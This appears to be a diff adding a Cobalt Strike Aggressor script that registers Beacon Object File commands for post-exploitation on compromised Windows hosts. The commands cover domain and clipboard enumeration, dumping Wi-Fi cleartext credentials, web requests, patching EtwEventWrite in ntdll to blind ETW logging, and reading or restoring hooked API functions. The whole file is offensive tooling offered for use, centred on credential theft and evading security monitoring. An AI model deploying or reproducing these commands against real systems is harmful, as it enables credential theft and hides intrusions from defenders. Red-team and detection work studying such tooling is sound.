@@ -1,0 +1,287 @@
+sub readbof {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+    println(script_resource("bof $+ / $+ $2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$handle = openf(script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	if(strlen($data) == 0)
+	{
+		berror($1, "could not read bof file");
+	}
+
+	# pack our arguments
+	#$args   = bof_pack($1, "zi", "Hello World", 1234);
+
+	# announce what we're doing
+	btask($1, "Running $2");
+	return $data;
+}
+
+
+
+## --start-- domaininfo
+alias domaininfo {
+	beacon_inline_execute($1, readbof($1, "get-domaininfo"), "go", $null);
+}
+
+beacon_command_register(
+	"domaininfo",
+	"[BOF] Returns information on the current domain and domain controller.",
+	"Usage: domaininfo"
+);
+## --end-- domaininfo
+
+## --start-- clipboard
+alias clipboard {
+	beacon_inline_execute($1, readbof($1, "get-clipboard"), "go", $null);
+}
+
+beacon_command_register(
+	"clipboard",
+	"[BOF] Prints any text on the clipboard.",
+	"Usage: clipboard"
+);
+## --end-- clipboard
+
+## --start-- wifidump
+alias wifidump {
+	local('$args');
+	$args = bof_pack($1, "Z", $2);
+	# announce what we're doing
+	btask($1, "Running wifidump BOF");
+
+	beacon_inline_execute($1, readbof($1, "wifidump"), "go", $args);
+}
+
+beacon_command_register(
+	"wifidump",
+	"[BOF] dumps wifi clear text credentials",
+	"Usage: wifidump [Wifi_Profile_Name]"
+);
+## --end-- wifidump
+
+## --start-- wifienum
+alias wifienum {
+	# announce what we're doing
+	btask($1, "Running wifienum BOF");
+
+	beacon_inline_execute($1, readbof($1, "wifienum"), "go", $null);
+}
+
+beacon_command_register(
+	"wifienum",
+	"[BOF] Enumerates WiFi interfaces.",
+	"Usage: wifienum"
+);
+## --end-- wifienum
+
+## --start-- curl
+beacon_command_register(
+"curl", 
+"[BOF] Performs a web request against target server and port",
+"curl host [port] [method] [--show] [useragent] [headers] [body] [--noproxy]");
+
+alias curl {
+	local('$barch $args');
+
+	if(size(@_) < 2)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("curl"));
+		return;
+	}
+
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	$printoutput = 0;
+	if ($5 eq "--show"){
+		$printoutput = 1;
+	}
+	
+	$proxy = 1;
+	if ($5 eq "--noproxy"){
+		$proxy = 0;
+	}
+
+	if (size(@_) >= 4){
+		if (($4 ne "GET") && 
+			($4 ne "POST") && 
+			($4 ne "PUT") && 
+			($4 ne "PATCH") && 
+			($4 ne "DELETE"))
+		{
+			berror($1, "HTTP method  $+ $4 $+  isn't valid.");
+			berror($1, beacon_command_detail("curl"));
+			return;
+		}
+	}
+
+	if(size(@_) == 2)
+	{
+		# pack our arguments
+		$args = bof_pack($1, "zizizzzi", $2, 0, "GET", $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
+	
+	}else if(size(@_) == 3)
+	{
+		# pack our arguments
+		$args = bof_pack($1, "zizizzzi", $2, $3, "GET", $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
+	
+	} else if(size(@_) == 4)
+	{
+
+		# include method
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
+	
+	} else if(size(@_) == 5)
+	{
+		# include print option
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
+	} else if(size(@_) == 6)
+	{
+		# include useragent
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, "Accept: */*", "", $proxy);
+	} else if(size(@_) == 7)
+	{
+		# include headers
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, "", $proxy);
+	} else if(size(@_) == 8)
+	{
+		# include body
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, $8, $proxy);
+	} else if(size(@_) == 9)
+	{
+		# include proxy choice
+		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, $8, $proxy);
+	}
+
+	# announce what we're doing
+	btask($1, "Running Simple Web Request Utility (@ajpc500)");
+
+	# execute it.
+	beacon_inline_execute($1, readbof($1, "curl"), "go", $args);
+}
+## --end-- curl
+
+## --start-- etw
+beacon_command_register(
+	"etw", 
+	"[BOF] Start or stop ETW logging.", 
+	"etw stop - patch out EtwEventWrite in Ntdll.dll to prevent ETW-based logging.
+	 etw start - patch back in EtwEventWrite in Ntdll.dll to restart ETW-based logging."
+);
+
+alias etw {
+	local('$barch $args');
+
+	if(size(@_) != 2)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("etw"));
+		return;
+	}
+
+	if(($2 eq "start")||($2 eq "stop"))
+	{
+		# figure out the arch of this session
+		$barch  = barch($1);
+
+		# pack our arguments
+		$args = bof_pack($1, "z", $2);
+		
+		# announce what we're doing
+		btask($1, "Running ETW patching BOF (@ajpc500)");
+		
+		# execute it.
+		beacon_inline_execute($1, readbof($1, "etw"), "go", $args);
+	}else{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("etw"));
+		return;
+	}
+}
+## --end-- etw
+
+## --start-- functionutil
+beacon_command_register(
+"read_function", 
+"[BOF] Read in-memory API function call, compare to on-disk DLL and patch bytes from on-disk DLL.",
+"read_function ntdll.dll EtwEventWrite - Retrieve function bytes.");
+
+
+
+beacon_command_register(
+"check_function", 
+"[BOF] Read in-memory API function call, compare to on-disk DLL and patch bytes from on-disk DLL.",
+"check_function ntdll.dll EtwEventWrite - Retrieve function bytes from memory and disk and compare.");
+
+
+beacon_command_register(
+"patch_function", 
+"[BOF] Read in-memory API function call, compare to on-disk DLL and patch bytes from on-disk DLL.",
+"patch_function ntdll.dll EtwEventWrite - Write on-disk function bytes onto in-memory function.");
+
+
+alias read_function {
+	local('$args');
+
+	if(size(@_) != 3)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("read_function"));
+		return;
+	}
+
+	# pack our arguments
+	$args = bof_pack($1, "zzi", $2, $3, 0);
+	
+	# announce what we're doing
+	btask($1, "Running API Function Utility (@ajpc500)");
+	
+	# execute it.
+	beacon_inline_execute($1, readbof($1, "functionutil"), "go", $args);
+}
+
+alias check_function {
+	local('$args');
+
+	if(size(@_) != 3)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("check_function"));
+		return;
+	}
+
+	# pack our arguments
+	$args = bof_pack($1, "zzi", $2, $3, 1);
+	
+	# announce what we're doing
+	btask($1, "Running API Function Utility (@ajpc500)");
+
+	# execute it.
+	beacon_inline_execute($1, readbof($1, "functionutil"), "go", $args);
+}
+
+alias patch_function {
+	local('$args');
+
+	if(size(@_) != 3)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("patch_function"));
+		return;
+	}
+
+	# pack our arguments
+	$args = bof_pack($1, "zzi", $2, $3, 2);
+	
+	# announce what we're doing
+	btask($1, "Running API Function Utility (@ajpc500)");
+
+	# execute it.
+	beacon_inline_execute($1, readbof($1, "functionutil"), "go", $args);
+}
+## --end-- functionutil
